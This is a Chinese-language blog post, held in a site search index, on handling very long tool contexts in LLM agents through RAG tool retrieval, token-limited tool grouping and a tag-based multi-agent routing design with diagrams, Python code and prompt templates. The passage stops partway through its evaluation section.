<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Agent多工具超长上下文处理方案</title>
      <link href="/posts/252.html"/>
      <url>/posts/252.html</url>
      
        <content type="html"><![CDATA[<h2 id="方案原理"><a href="#方案原理" class="headerlink" title="方案原理"></a>方案原理</h2><h3 id="rag方案"><a href="#rag方案" class="headerlink" title="rag方案"></a>rag方案</h3><p>rag 示例：</p><ul><li><a href="https://github.com/run-llama/llama_index/blob/df48f1d83b032aae3ec232013a11401cd26ea184/docs/docs/examples/agent/openai_agent_retrieval.ipynb#L223">https://github.com/run-llama/llama_index/blob/df48f1d83b032aae3ec232013a11401cd26ea184/docs/docs/examples/agent/openai_agent_retrieval.ipynb#L223</a></li><li><a href="https://github.com/HRI-EU/tulip_agent/blob/main/examples/tool_library_search.py">https://github.com/HRI-EU/tulip_agent/blob/main/examples/tool_library_search.py</a></li><li><a href="https://hri-eu.github.io/tulip_agent/">https://hri-eu.github.io/tulip_agent/</a></li></ul><h4 id="工具搜索的原理图"><a href="#工具搜索的原理图" class="headerlink" title="工具搜索的原理图"></a>工具搜索的原理图</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[ToolLibrary] --&gt; B[工具管理]</span><br><span class="line">    A --&gt; C[向量存储]</span><br><span class="line">    A --&gt; D[嵌入模型]</span><br><span class="line"></span><br><span class="line">    B --&gt; E[加载工具]</span><br><span class="line">    B --&gt; F[搜索工具]</span><br><span class="line">    B --&gt; G[执行工具]</span><br><span class="line">    B --&gt; H[更新工具]</span><br><span class="line">    B --&gt; I[删除工具]</span><br><span class="line"></span><br><span class="line">    E --&gt; J[从文件加载]</span><br><span class="line">    E --&gt; K[从实例加载]</span><br><span class="line"></span><br><span class="line">    C --&gt; L[ChromaDB]</span><br><span class="line">    L --&gt; M[存储工具定义]</span><br><span class="line">    L --&gt; N[存储工具嵌入]</span><br><span class="line"></span><br><span class="line">    F --&gt; O[语义搜索]</span><br><span class="line">    O --&gt; P[相似度匹配]</span><br></pre></td></tr></table></figure><h4 id="工具嵌入"><a href="#工具嵌入" class="headerlink" title="工具嵌入"></a>工具嵌入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[初始化 ToolLibrary] --&gt; B[设置基本参数]</span><br><span class="line">    B --&gt; C[创建嵌入模型客户端]</span><br><span class="line">    C --&gt; D[初始化 FunctionAnalyzer]</span><br><span class="line">    D --&gt; E[设置超时参数]</span><br><span class="line">    E --&gt; F[创建/连接 ChromaDB]</span><br><span class="line">    F --&gt; G[获取已存储的工具]</span><br><span class="line"></span><br><span class="line">    G --&gt; H&#123;检查已存储工具&#125;</span><br><span class="line">    H --&gt;|工具有效| I[加载到内存]</span><br><span class="line">    H --&gt;|工具无效| J[从向量存储中删除]</span><br><span class="line"></span><br><span class="line">    I --&gt; K&#123;是否有新工具导入?&#125;</span><br><span class="line">    J --&gt; K</span><br><span class="line"></span><br><span class="line">    K --&gt;|是| L[从文件导入工具]</span><br><span class="line">    K --&gt;|是| M[从实例导入工具]</span><br><span class="line">    K --&gt;|否| N[初始化完成]</span><br><span class="line"></span><br><span class="line">    L --&gt; O[保存新工具到向量存储]</span><br><span class="line">    M --&gt; O</span><br><span class="line">    O --&gt; N</span><br></pre></td></tr></table></figure><h4 id="优化方向"><a href="#优化方向" class="headerlink" title="优化方向"></a>优化方向</h4><ul><li>增加问题转译，将问题转译为更利于工具搜索的格式</li><li>问题转译生成 top k 个问题，每个问题对应一个工具集，召回后去重</li><li>生成 Q &amp; A 对，优化特定问题</li></ul><h3 id="分组加载方案"><a href="#分组加载方案" class="headerlink" title="分组加载方案"></a><del>分组加载方案</del></h3><h4 id="原理概述"><a href="#原理概述" class="headerlink" title="原理概述"></a>原理概述</h4><p>分组加载方案是解决大规模工具集管理的关键策略之一。当工具数量增长到一定规模时，将所有工具描述同时传入LLM会迅速耗尽上下文长度限制。分组加载方案通过智能监测和动态分组，确保在token限制内最大化工具使用效率。</p><h4 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h4><ol><li><p><strong>Token监测器</strong>：</p><ul><li>实时计算每个工具描述的token数量</li><li>预估不同工具组合的总token消耗</li><li>监控LLM上下文窗口剩余容量</li></ul></li><li><p><strong>工具分组引擎</strong>：</p><ul><li>基于语义相似性聚类相关工具</li><li>根据使用频率和历史相关性进行优先级排序</li><li>维护工具之间的依赖关系图</li></ul></li><li><p><strong>LLM调用协调器</strong>：</p><ul><li>管理多轮工具加载和LLM调用</li><li>在工具组之间传递上下文和状态</li><li>汇总多次调用的结果</li></ul></li></ol><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[用户查询] --&gt; B[查询分析器]</span><br><span class="line">    B --&gt; C[工具相关性评分]</span><br><span class="line">    C --&gt; D[Token计算]</span><br><span class="line">    D --&gt; E&#123;Token超限?&#125;</span><br><span class="line"></span><br><span class="line">    E --&gt;|否| F[单次加载所有工具]</span><br><span class="line">    E --&gt;|是| G[启动分组加载流程]</span><br><span class="line"></span><br><span class="line">    G --&gt; H[工具聚类分组]</span><br><span class="line">    H --&gt; I[优先级排序]</span><br><span class="line">    I --&gt; J[分批LLM调用]</span><br><span class="line"></span><br><span class="line">    J --&gt; K[结果汇总]</span><br><span class="line">    F --&gt; K</span><br><span class="line"></span><br><span class="line">    K --&gt; L[响应用户]</span><br><span class="line"></span><br><span class="line">    M[用户反馈] --&gt; N[更新工具使用统计]</span><br><span class="line">    N --&gt; O[优化分组策略]</span><br></pre></td></tr></table></figure><h4 id="分组策略"><a href="#分组策略" class="headerlink" title="分组策略"></a>分组策略</h4><p>分组加载采用多种策略来优化工具分组：</p><ol><li><strong>基于相似度聚类</strong>：使用工具描述的语义嵌入进行聚类</li><li><strong>基于频率分组</strong>：常用工具优先加载</li><li><strong>基于任务分组</strong>：相同任务类型的工具组合在一起</li><li><strong>动态分组</strong>：根据当前查询实时调整分组</li></ol><h4 id="循环加载机制"><a href="#循环加载机制" class="headerlink" title="循环加载机制"></a>循环加载机制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[用户查询] --&gt; B[初始化工具组索引]</span><br><span class="line">    B --&gt; C[选择第一个工具组]</span><br><span class="line">    C --&gt; D[&quot;LLM调用(带工具组)&quot;]</span><br><span class="line">    D --&gt; E&#123;找到所需工具?&#125;</span><br><span class="line"></span><br><span class="line">    E --&gt;|是| F[执行工具]</span><br><span class="line">    E --&gt;|否| G&#123;还有更多工具组?&#125;</span><br><span class="line"></span><br><span class="line">    G --&gt;|是| H[加载下一工具组]</span><br><span class="line">    H --&gt; D</span><br><span class="line"></span><br><span class="line">    G --&gt;|否| I[回退到通用回答]</span><br><span class="line"></span><br><span class="line">    F --&gt; J[返回结果]</span><br><span class="line">    I --&gt; J</span><br></pre></td></tr></table></figure><h4 id="实现示例"><a href="#实现示例" class="headerlink" title="实现示例"></a>实现示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">group_tools_by_token_limit</span>(<span class="params">tools, max_tokens=<span class="number">4000</span></span>):</span><br><span class="line">    <span class="comment"># 计算每个工具描述的token数</span></span><br><span class="line">    tool_tokens = [(tool, count_tokens(<span class="string">f&quot;<span class="subst">&#123;tool.name&#125;</span>: <span class="subst">&#123;tool.description&#125;</span>&quot;</span>)) </span><br><span class="line">                  <span class="keyword">for</span> tool <span class="keyword">in</span> tools]</span><br><span class="line"></span><br><span class="line">    groups = []</span><br><span class="line">    current_group = []</span><br><span class="line">    current_tokens = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> tool, tokens <span class="keyword">in</span> <span class="built_in">sorted</span>(tool_tokens, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">if</span> current_tokens + tokens &gt; max_tokens:</span><br><span class="line">            <span class="comment"># 当前组达到token上限，创建新组</span></span><br><span class="line">            groups.append(current_group)</span><br><span class="line">            current_group = [tool]</span><br><span class="line">            current_tokens = tokens</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current_group.append(tool)</span><br><span class="line">            current_tokens += tokens</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_group:</span><br><span class="line">        groups.append(current_group)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> groups</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cyclic_tool_execution</span>(<span class="params">user_query, tool_groups</span>):</span><br><span class="line">    context = &#123;<span class="string">&quot;query&quot;</span>: user_query, <span class="string">&quot;results&quot;</span>: []&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> group_idx, tool_group <span class="keyword">in</span> <span class="built_in">enumerate</span>(tool_groups):</span><br><span class="line">        llm_response = call_llm_with_tools(</span><br><span class="line">            context[<span class="string">&quot;query&quot;</span>], </span><br><span class="line">            tool_group, </span><br><span class="line">            <span class="string">f&quot;This is group <span class="subst">&#123;group_idx+<span class="number">1</span>&#125;</span> of <span class="subst">&#123;<span class="built_in">len</span>(tool_groups)&#125;</span>. &quot;</span></span><br><span class="line">            <span class="string">f&quot;Use these tools if they seem relevant to the query.&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> llm_response.has_tool_calls():</span><br><span class="line">            tool_results = execute_tool_calls(llm_response.tool_calls)</span><br><span class="line">            context[<span class="string">&quot;results&quot;</span>].extend(tool_results)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新查询上下文</span></span><br><span class="line">            follow_up = call_llm(</span><br><span class="line">                <span class="string">f&quot;Based on these results so far: <span class="subst">&#123;tool_results&#125;</span>, &quot;</span></span><br><span class="line">                <span class="string">f&quot;should we continue searching with more tool groups? &quot;</span></span><br><span class="line">                <span class="string">f&quot;If yes, refine the search query.&quot;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;continue&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> follow_up.lower():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            context[<span class="string">&quot;query&quot;</span>] = extract_refined_query(follow_up)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 合并所有结果生成最终回答</span></span><br><span class="line">    final_answer = call_llm(</span><br><span class="line">        <span class="string">f&quot;Based on all results: <span class="subst">&#123;context[<span class="string">&#x27;results&#x27;</span>]&#125;</span>, &quot;</span></span><br><span class="line">        <span class="string">f&quot;provide a comprehensive answer to the original query: <span class="subst">&#123;user_query&#125;</span>&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> final_answer</span><br></pre></td></tr></table></figure><h3 id="多Agent路由系统设计报告"><a href="#多Agent路由系统设计报告" class="headerlink" title="多Agent路由系统设计报告"></a>多Agent路由系统设计报告</h3><h4 id="1-执行摘要"><a href="#1-执行摘要" class="headerlink" title="1. 执行摘要"></a>1. 执行摘要</h4><p>本报告提出了一个基于工具标签的多Agent路由系统设计方案。该系统通过为每个工具分配适用的Agent标签，实现工具到专业Agent的映射，并通过智能路由机制将用户查询分配给最合适的Agent处理。这种设计能够提高系统的响应效率、专业性和可扩展性，特别适合管理大规模工具库的场景。</p><h4 id="2-系统架构"><a href="#2-系统架构" class="headerlink" title="2. 系统架构"></a>2. 系统架构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[用户查询] --&gt; B[路由器Agent]</span><br><span class="line">    B --&gt; C&#123;路由决策&#125;</span><br><span class="line">    C --&gt;|金融查询| D[金融Agent]</span><br><span class="line">    C --&gt;|数据分析| E[数据分析Agent]</span><br><span class="line">    C --&gt;|系统操作| F[系统Agent]</span><br><span class="line">    C --&gt;|通用查询| G[通用Agent]</span><br><span class="line"></span><br><span class="line">    D --&gt; D1[金融工具集]</span><br><span class="line">    E --&gt; E1[数据分析工具集]</span><br><span class="line">    F --&gt; F1[系统工具集]</span><br><span class="line">    G --&gt; G1[通用工具集]</span><br><span class="line"></span><br><span class="line">    D --&gt; Z[结果整合]</span><br><span class="line">    E --&gt; Z</span><br><span class="line">    F --&gt; Z</span><br><span class="line">    G --&gt; Z</span><br><span class="line">    Z --&gt; Y[返回用户]</span><br></pre></td></tr></table></figure><h5 id="2-1-核心组件"><a href="#2-1-核心组件" class="headerlink" title="2.1 核心组件"></a>2.1 核心组件</h5><ol><li><p><strong>增强版工具库</strong></p><ul><li>扩展现有ToolLibrary，添加Agent标签支持</li><li>提供工具-Agent映射管理功能</li><li>实现基于查询的Agent推荐机制</li></ul></li><li><p><strong>Agent管理器</strong></p><ul><li>负责创建和管理专业Agent</li><li>维护Agent与工具集的关联</li><li>协调查询处理流程</li></ul></li><li><p><strong>专业Agent</strong></p><ul><li>每个Agent专注于特定领域</li><li>拥有针对该领域优化的工具集</li><li>使用定制的系统提示词增强专业能力</li></ul></li><li><p><strong>路由器Agent</strong></p><ul><li>分析用户查询意图</li><li>结合工具相关性评估选择合适的Agent</li><li>支持查询分解和多Agent协作</li></ul></li></ol><h4 id="3-工具标签系统"><a href="#3-工具标签系统" class="headerlink" title="3. 工具标签系统"></a>3. 工具标签系统</h4><h5 id="3-1-多维度标签体系"><a href="#3-1-多维度标签体系" class="headerlink" title="3.1 多维度标签体系"></a>3.1 多维度标签体系</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[工具标签体系] --&gt; B[领域标签]</span><br><span class="line">    A --&gt; C[功能标签]</span><br><span class="line">    A --&gt; D[复杂度标签]</span><br><span class="line">    A --&gt; E[权限标签]</span><br><span class="line"></span><br><span class="line">    B --&gt; B1[金融]</span><br><span class="line">    B --&gt; B2[数据分析]</span><br><span class="line">    B --&gt; B3[系统操作]</span><br><span class="line">    B --&gt; B4[通信]</span><br><span class="line">    B --&gt; B5[文件处理]</span><br><span class="line"></span><br><span class="line">    C --&gt; C1[查询]</span><br><span class="line">    C --&gt; C2[计算]</span><br><span class="line">    C --&gt; C3[转换]</span><br><span class="line">    C --&gt; C4[生成]</span><br><span class="line">    C --&gt; C5[验证]</span><br><span class="line"></span><br><span class="line">    D --&gt; D1[简单]</span><br><span class="line">    D --&gt; D2[中等]</span><br><span class="line">    D --&gt; D3[复杂]</span><br><span class="line"></span><br><span class="line">    E --&gt; E1[低权限]</span><br><span class="line">    E --&gt; E2[中权限]</span><br><span class="line">    E --&gt; E3[高权限]</span><br></pre></td></tr></table></figure><h5 id="3-2-标签生成策略"><a href="#3-2-标签生成策略" class="headerlink" title="3.2 标签生成策略"></a>3.2 标签生成策略</h5><p>使用LLM自动为工具生成标签，基于以下信息：</p><ul><li>工具名称和描述</li><li>参数和返回值</li><li>功能特性和使用场景</li></ul><p><strong>标签生成提示词框架</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">请为以下工具分配适当的标签，以便在多Agent系统中使用：</span><br><span class="line"></span><br><span class="line">工具名称: [工具名]</span><br><span class="line">描述: [工具描述]</span><br><span class="line">参数: [参数列表]</span><br><span class="line">返回值: [返回值描述]</span><br><span class="line"></span><br><span class="line">请从以下类别中为该工具分配标签：</span><br><span class="line">1. 领域标签（选择所有适用的）：[领域选项列表]</span><br><span class="line">2. 功能标签（选择所有适用的）：[功能选项列表]</span><br><span class="line">3. 复杂度标签（选择一个）：[复杂度选项列表]</span><br><span class="line">4. 权限标签（选择一个）：[权限选项列表]</span><br><span class="line"></span><br><span class="line">请以JSON格式返回标签，并指明该工具最适合分配给哪些类型的Agent。</span><br></pre></td></tr></table></figure><h4 id="4-系统流程"><a href="#4-系统流程" class="headerlink" title="4. 系统流程"></a>4. 系统流程</h4><h5 id="4-1-初始化流程"><a href="#4-1-初始化流程" class="headerlink" title="4.1 初始化流程"></a>4.1 初始化流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant Admin as 系统管理员</span><br><span class="line">    participant TL as 工具库</span><br><span class="line">    participant AM as Agent管理器</span><br><span class="line">    participant LLM as 大型语言模型</span><br><span class="line"></span><br><span class="line">    Admin-&gt;&gt;TL: 初始化工具库</span><br><span class="line">    TL-&gt;&gt;TL: 加载工具</span><br><span class="line"></span><br><span class="line">    loop 为每个工具添加标签</span><br><span class="line">        TL-&gt;&gt;LLM: 请求生成工具标签</span><br><span class="line">        LLM--&gt;&gt;TL: 返回标签建议</span><br><span class="line">        TL-&gt;&gt;TL: 存储工具标签</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    Admin-&gt;&gt;AM: 创建Agent管理器</span><br><span class="line"></span><br><span class="line">    loop 创建专业Agent</span><br><span class="line">        Admin-&gt;&gt;AM: 定义Agent(名称、描述、标签)</span><br><span class="line">        AM-&gt;&gt;TL: 获取符合标签的工具</span><br><span class="line">        TL--&gt;&gt;AM: 返回工具子集</span><br><span class="line">        AM-&gt;&gt;AM: 创建专业Agent实例</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    Admin-&gt;&gt;AM: 创建路由器Agent</span><br></pre></td></tr></table></figure><h5 id="4-2-查询处理流程"><a href="#4-2-查询处理流程" class="headerlink" title="4.2 查询处理流程"></a>4.2 查询处理流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant User as 用户</span><br><span class="line">    participant Router as 路由器Agent</span><br><span class="line">    participant TL as 工具库</span><br><span class="line">    participant SA as 专业Agent</span><br><span class="line">    participant Tool as 工具</span><br><span class="line"></span><br><span class="line">    User-&gt;&gt;Router: 提交查询</span><br><span class="line">    Router-&gt;&gt;TL: 请求Agent建议</span><br><span class="line">    TL--&gt;&gt;Router: 返回Agent建议</span><br><span class="line"></span><br><span class="line">    Router-&gt;&gt;Router: 分析查询并做出路由决策</span><br><span class="line">    Router-&gt;&gt;SA: 转发查询到选定Agent</span><br><span class="line"></span><br><span class="line">    SA-&gt;&gt;SA: 分析查询</span><br><span class="line"></span><br><span class="line">    opt 需要工具调用</span><br><span class="line">        SA-&gt;&gt;Tool: 调用工具</span><br><span class="line">        Tool--&gt;&gt;SA: 返回结果</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    SA-&gt;&gt;SA: 生成最终回答</span><br><span class="line">    SA--&gt;&gt;User: 返回回答</span><br></pre></td></tr></table></figure><h4 id="5-专业Agent配置"><a href="#5-专业Agent配置" class="headerlink" title="5. 专业Agent配置"></a>5. 专业Agent配置</h4><h5 id="5-1-Agent类型与职责"><a href="#5-1-Agent类型与职责" class="headerlink" title="5.1 Agent类型与职责"></a>5.1 Agent类型与职责</h5><table><thead><tr><th>Agent类型</th><th>主要职责</th><th>工具类别</th><th>优化提示词重点</th></tr></thead><tbody><tr><td>金融Agent</td><td>处理金融、投资、股票相关查询</td><td>股价查询、市场分析、投资计算</td><td>金融术语理解、数据解读、风险评估</td></tr><tr><td>数据分析Agent</td><td>处理数据处理、统计分析相关查询</td><td>数据处理、统计计算、可视化</td><td>数据理解、分析方法、结果解释</td></tr><tr><td>系统Agent</td><td>处理系统操作、文件管理相关查询</td><td>文件操作、系统命令、进程管理</td><td>系统知识、安全考虑、效率优化</td></tr><tr><td>通用Agent</td><td>处理一般性查询和跨领域问题</td><td>所有工具的子集</td><td>综合判断、任务分解、知识整合</td></tr></tbody></table><h5 id="5-2-Agent系统提示词模板"><a href="#5-2-Agent系统提示词模板" class="headerlink" title="5.2 Agent系统提示词模板"></a>5.2 Agent系统提示词模板</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">你是[Agent名称]，一个专门处理[Agent描述]的AI助手。</span><br><span class="line"></span><br><span class="line">你有权访问以下工具来帮助完成任务：</span><br><span class="line">[工具列表及描述]</span><br><span class="line"></span><br><span class="line">当用户提出问题时，请按照以下步骤操作：</span><br><span class="line">1. 分析用户的问题和需求</span><br><span class="line">2. 确定需要使用哪些工具来解决问题</span><br><span class="line">3. 调用适当的工具获取必要的信息</span><br><span class="line">4. 基于工具返回的结果，提供清晰、准确的回答</span><br><span class="line"></span><br><span class="line">[特定领域的专业指导]</span><br><span class="line"></span><br><span class="line">如果工具执行出错，请尝试理解错误原因并提供替代解决方案。</span><br><span class="line">始终以专业、有帮助的方式回应用户。</span><br></pre></td></tr></table></figure><h5 id="5-3-路由器提示词模板"><a href="#5-3-路由器提示词模板" class="headerlink" title="5.3 路由器提示词模板"></a>5.3 路由器提示词模板</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">你是一个智能路由器，负责将用户查询分配给最合适的专业Agent。</span><br><span class="line"></span><br><span class="line">可用的Agent有：</span><br><span class="line">[Agent列表及描述]</span><br><span class="line"></span><br><span class="line">你的任务是：</span><br><span class="line">1. 分析用户查询的内容和意图</span><br><span class="line">2. 确定哪个Agent最适合处理该查询</span><br><span class="line">3. 将查询转发给选定的Agent</span><br><span class="line"></span><br><span class="line">如果查询需要多个Agent协作处理，你可以将查询分解为子任务，并分配给相应的Agent。</span><br><span class="line">如果没有Agent明确适合处理查询，将其分配给通用Agent。</span><br><span class="line"></span><br><span class="line">请始终以JSON格式返回你的路由决策：</span><br><span class="line">&#123;&quot;selected_agent&quot;: &quot;agent_name&quot;, &quot;reason&quot;: &quot;选择该Agent的原因&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="6-实施建议"><a href="#6-实施建议" class="headerlink" title="6. 实施建议"></a>6. 实施建议</h4><h5 id="6-1-分阶段实施计划"><a href="#6-1-分阶段实施计划" class="headerlink" title="6.1 分阶段实施计划"></a>6.1 分阶段实施计划</h5><ol><li><p><strong>第一阶段：基础设施建设</strong></p><ul><li>扩展工具库，添加标签支持</li><li>实现基本的Agent管理功能</li><li>开发简单的路由机制</li></ul></li><li><p><strong>第二阶段：专业Agent开发</strong></p><ul><li>定义核心Agent类型</li><li>为每种Agent优化系统提示词</li><li>实现工具-Agent映射</li></ul></li><li><p><strong>第三阶段：路由优化</strong></p><ul><li>开发基于嵌入的相似度计算</li><li>实现智能路由决策</li><li>添加路由反馈机制</li></ul></li><li><p><strong>第四阶段：系统集成与优化</strong></p><ul><li>实现完整的查询处理流程</li><li>添加性能监控和日志</li><li>优化系统响应时间</li></ul></li></ol><h5 id="6-2-性能优化建议"><a href="#6-2-性能优化建议" class="headerlink" title="6.2 性能优化建议"></a>6.2 性能优化建议</h5><ul><li>使用缓存减少重复嵌入计算</li><li>实现并行处理多Agent查询</li><li>预计算常见查询类型的路由决策</li><li>定期更新工具标签以适应变化</li></ul><h5 id="6-3-扩展性考虑"><a href="#6-3-扩展性考虑" class="headerlink" title="6.3 扩展性考虑"></a>6.3 扩展性考虑</h5><ul><li>设计模块化接口便于添加新Agent</li><li>支持动态加载和卸载工具</li><li>实现Agent之间的协作通信协议</li><li>提供自定义Agent和工具标签的接口</li></ul><h4 id="7-评估与监控"><a href="#7-评估与监控" class="headerlink" title="7. 评估与监控"></a>7. 评估与监控</h4><h5 id="7-1-关键性能指标"><a href="#7-1-关键性能指标" class="headerlink" title="7.1 关键性能指标"></a>7.1 